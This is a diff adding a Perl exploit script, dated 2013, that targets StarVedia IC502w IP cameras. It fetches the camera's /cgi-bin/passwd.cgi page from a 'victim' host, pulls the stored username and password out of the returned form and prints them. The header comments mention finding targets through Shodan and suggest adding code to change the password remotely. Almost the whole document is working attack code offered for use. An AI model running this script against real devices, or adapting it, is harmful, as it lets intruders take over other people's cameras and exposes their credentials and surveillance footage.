@@ -1,0 +1,46 @@
+#!/usr/bin/perl
+#
+#  [+] StarVedia IPCamera IC502w IC502w+ v020313 remote bypass username/password disclosure exploit
+#  Author: Todor Donev
+#  Email: todor.donev at gmail dot com
+#  Type: Hardware
+#
+#  Thanks to Tsvetelina Emirska the best friend in my life 
+#  and all my other friends for the help and support which 
+#  gives me. Kind regards to all of you, who read my lil' 
+#  exploits.
+#  Bulgaria, Sofia
+#  03.2013
+#
+#  Shodanhq r0x 4 teh lulz!!
+#  http://www.youtube.com/watch?v=qNyN1AY-YZQ  Cheeerzz =))
+#
+#  Another bug, hint: you can edit this code and add some lines for remote change the password.
+#####
+
+use LWP::Simple;
+if (@ARGV == 0) {&usg;}
+while (@ARGV > 0) {
+$type = shift(@ARGV);
+$t = shift(@ARGV);
+}
+if ($type eq "-d") {
+my $r = get("http://$t/cgi-bin/passwd.cgi?") or die(" $t: Not vulneruble, $!\n");
+print " [+] StarVedia IPCamera IC502w IC502w+ v020313 remote bypass username/password disclosure exploit\n";
+print " [!] Exploiting: $t\n";
+if ($r =~ m/<INPUT type=text name=user size=20 maxlength=19 value="(.*)">/g) {
+$result .= "   [o] User: $1\n";
+}else{die(" Try another exploit, $!");}     
+if ($r =~ m/<INPUT type=password name=passwd size=20 maxlength=19 value="(.*)">/g){
+$result .= "   [o] Password: $1\n";
+}else{die("Try another exploit or restart the exploit\n");}
+sleep(1);
+print " [\\m/] BINGO!!!\n\a".$result; 
+}
+sub usg(){
+print " [!] usg: perl $0 [-r or -d] <victim:port>\n";
+print " [!]  -d: disclosure password option\n";
+print " [!] exp: perl $0 -d 127.0.0.1 :)\n";
+exit;
+}
+
